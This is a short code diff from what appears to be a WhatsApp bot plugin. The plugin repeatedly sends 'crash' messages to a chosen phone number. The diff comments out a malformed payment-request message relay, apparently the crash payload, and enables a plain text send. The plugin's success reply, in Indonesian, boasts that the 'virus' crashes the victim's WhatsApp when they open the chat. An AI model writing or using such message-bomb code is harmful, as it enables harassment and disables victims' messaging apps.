@@ -26,9 +26,9 @@ for (let i = 0; i < jumlah; i++) {
   
 let gmbr = await fetch('https://genix.eu.org/akebi.jpg')
     
-conn.relayMessage(num, { requestPaymentMessage: { Message: { extendedTextMessage: { text: '🗿', currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: global.ppmika }}}}, {})
+//conn.relayMessage(num, { requestPaymentMessage: { Message: { extendedTextMessage: { text: '🗿', currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: global.ppmika }}}}, {})
 
-//conn.sendMessage(num, { text: '🗿'}, { quoted: dann })
+conn.sendMessage(num, { text: '🗿'}, { quoted: dann })
 }
 m.reply(`Sukses Mengirim ${command}\nKe Nomor: ${text}\n\n*Note :* Virus ini aktif ketika korban membuka chat nya, maka WhatsApp akan crash hehe`)
 }
